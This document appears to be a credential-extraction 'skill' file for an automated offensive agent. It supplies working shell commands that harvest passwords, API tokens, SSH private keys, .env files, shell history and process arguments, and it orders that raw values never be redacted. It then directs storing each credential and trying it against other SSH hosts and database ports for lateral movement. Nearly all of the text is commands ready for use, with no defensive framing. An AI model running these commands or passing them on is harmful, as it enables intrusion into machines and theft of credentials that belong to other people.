# Credential Extraction

**Objective:** Harvest passwords, keys, and tokens that unlock access to other hosts.

---

## Where Credentials Hide

**Environment variables** — filter for common secret keywords. Never pipe through redaction filters — raw values only.

```bash
env | grep -iE "pass|secret|key|token|api|auth|pwd|cred"
cat /proc/*/environ 2>/dev/null | tr '\0' '\n' | grep -iE "pass|secret|key|token|api"
```

**Configuration files** — `/etc/` and app directories often store DB passwords and service credentials in plaintext.

```bash
# Broad grep across common config locations
grep -rniE "password|passwd|secret|api_key|token" /etc/ 2>/dev/null | grep -v Binary
grep -rniE "password|passwd|secret|api_key|token" /var/www/ /opt/ /srv/ /home/ 2>/dev/null | grep -v Binary

# Common high-value config files
cat /etc/mysql/my.cnf 2>/dev/null
cat /var/www/html/wp-config.php 2>/dev/null
cat /var/www/html/config.php 2>/dev/null
find / -name "database.yml" -o -name "settings.py" -o -name "config.json" 2>/dev/null | xargs cat
```

**Dotenv files** — `.env` files in home directories and app roots.

```bash
find / -name ".env" -type f 2>/dev/null | xargs cat
find / -name "*.env" -not -path "*/proc/*" 2>/dev/null | xargs cat
```

**SSH private keys** — look beyond the obvious locations.

```bash
# Standard locations
cat ~/.ssh/id_rsa ~/.ssh/id_ed25519 ~/.ssh/id_ecdsa 2>/dev/null
cat /root/.ssh/id_rsa /root/.ssh/id_ed25519 2>/dev/null

# All users
find /home /root -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null | xargs cat

# Known_hosts — reveals other targets worth scanning
cat ~/.ssh/known_hosts /root/.ssh/known_hosts /home/*/.ssh/known_hosts 2>/dev/null
```

**Shell history** — commands often contain inline credentials.

```bash
cat ~/.bash_history ~/.zsh_history /root/.bash_history 2>/dev/null
grep -iE "pass|secret|key|token|mysql|psql|ssh" ~/.bash_history 2>/dev/null
```

**In-memory and running processes** — credentials passed as arguments show up in process listings.

```bash
ps aux | grep -iE "pass|secret|key|token|api"
cat /proc/*/cmdline 2>/dev/null | tr '\0' ' ' | grep -iE "pass|secret|key"
```

---

## Privilege Escalation

Non-root shells block `/etc/shadow`, `/root/.ssh/`, and many config files. Check `sudo -l` for NOPASSWD entries first — a single allowed command may be enough to read the target file directly. For anything more involved, use `read_skill("privesc")`.

---

## After Results Arrive

Store every credential with `store_credential`. Before moving on, cross-reference against open ports and known targets:

- **Password found** — try it against all SSH-open hosts; people reuse passwords across machines.
- **SSH key found** — check `known_hosts` for candidate targets, then attempt login.
- **DB password found** — check if the DB port (3306, 5432, 1433) is reachable from any known host.
- **API key / token found** — note the service it belongs to; flag for manual follow-up.
